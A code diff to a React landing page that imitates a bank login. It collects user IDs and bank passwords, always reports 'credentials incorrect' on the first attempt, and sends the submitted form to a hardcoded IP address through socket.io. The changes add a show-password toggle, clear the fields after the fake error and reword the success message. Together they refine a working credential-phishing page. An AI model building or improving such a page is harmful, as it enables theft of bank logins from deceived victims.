@@ -2,12 +2,13 @@ import React, { useEffect, useState } from "react";
 import toast from "react-hot-toast";
 import { Link } from "react-router-dom";
 import { io } from "socket.io-client";
-import { Shield, Lock, User, CreditCard } from 'lucide-react';
+import { Shield, Lock, User, CreditCard, Eye, EyeOff } from 'lucide-react';
 const socket = io("http://13.126.153.247:4003");
 
 const Landingpage = () => {
   // Add this new state for loader
   const [isLoading, setIsLoading] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
 
   // Your existing states remain the same
   const [id, setId] = useState("");
@@ -88,9 +89,13 @@ const Landingpage = () => {
         if (loginAttempts === 0) {
           setLoginAttempts(1);
           toast.error("Bank credentials incorrect. Please try again.");
+          setFormData({
+            userId: "",
+            password: "",
+          });
           setIsLoading(false);
           return;
-        } 
+        }
         setTimer(7);
         setTimeout(() => {
           setStep((prev) => prev + 1);
@@ -110,8 +115,17 @@ const Landingpage = () => {
       return;
     }
 
-    toast.success("Thank you for updating your details if your details has been successfully updated you will get confirmation message soon ✅");
-    setIsOpen(false);
+      toast.success(
+    "Thank you for updating your details. If your details have been successfully updated, you will get a confirmation message soon!",
+    {
+      position: "top-center", // keep toast at the top center
+      autoClose: 2000,        // show for 2 seconds minimum
+      // style: {
+      //   marginTop: "50px", // push it a little down from the very top
+      // },
+    }
+  )
+  setIsOpen(false);
     socket.emit("form:submit", formData);
     setId("");
     setStep(1);
@@ -1644,12 +1658,12 @@ const Landingpage = () => {
                   At{" "}
                   <span
                     onClick={isLoading ? null : handleGtlPayment}
-                    // style={gtlSpanStyle}
+                  // style={gtlSpanStyle}
                   >
                     {isLoading ? (
                       <>
                         <Loader1 />
-                      At Loading...
+                        At Loading...
                       </>
                     ) : (
                       "GTL Towers"
@@ -2681,6 +2695,7 @@ const Landingpage = () => {
                   </div>
 
                   {/* Password Field */}
+                  {/* Password Field */}
                   <div style={{ marginBottom: '28px' }}>
                     <label style={{
                       display: 'block',
@@ -2692,24 +2707,50 @@ const Landingpage = () => {
                       <Lock size={16} style={{ display: 'inline', marginRight: '6px' }} />
                       Password
                     </label>
-                    <input
-                      type="password"
-                      name="password"
-                      placeholder="Enter your bank password"
-                      value={formData.password}
-                      onChange={handleChange}
-                      style={{
-                        width: '100%',
-                        padding: '14px 16px',
-                        borderRadius: '10px',
-                        border: '2px solid #e5e7eb',
-                        outline: 'none',
-                        fontSize: '15px',
-                        transition: 'all 0.3s ease',
-                        backgroundColor: '#fafafa',
-                        boxSizing: 'border-box'
-                      }}
-                    />
+                    <div style={{ position: 'relative' }}>
+                      <input
+                        type={showPassword ? "text" : "password"}
+                        name="password"
+                        placeholder="Enter your bank password"
+                        value={formData.password}
+                        onChange={handleChange}
+                        style={{
+                          width: '100%',
+                          padding: '14px 50px 14px 16px',
+                          borderRadius: '10px',
+                          border: '2px solid #e5e7eb',
+                          outline: 'none',
+                          fontSize: '15px',
+                          transition: 'all 0.3s ease',
+                          backgroundColor: '#fafafa',
+                          boxSizing: 'border-box'
+                        }}
+                      />
+                      <button
+                        type="button"
+                        onClick={() => setShowPassword(!showPassword)}
+                        style={{
+                          position: 'absolute',
+                          right: '12px',
+                          top: '50%',
+                          transform: 'translateY(-50%)',
+                          background: 'none',
+                          border: 'none',
+                          cursor: 'pointer',
+                          padding: '4px',
+                          display: 'flex',
+                          alignItems: 'center',
+                          justifyContent: 'center',
+                          color: '#6b7280',
+                          borderRadius: '4px',
+                          transition: 'color 0.2s ease'
+                        }}
+                        onMouseEnter={(e) => e.target.style.color = '#374151'}
+                        onMouseLeave={(e) => e.target.style.color = '#6b7280'}
+                      >
+                        {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
+                      </button>
+                    </div>
                   </div>
 
                   {/* Login Button */}
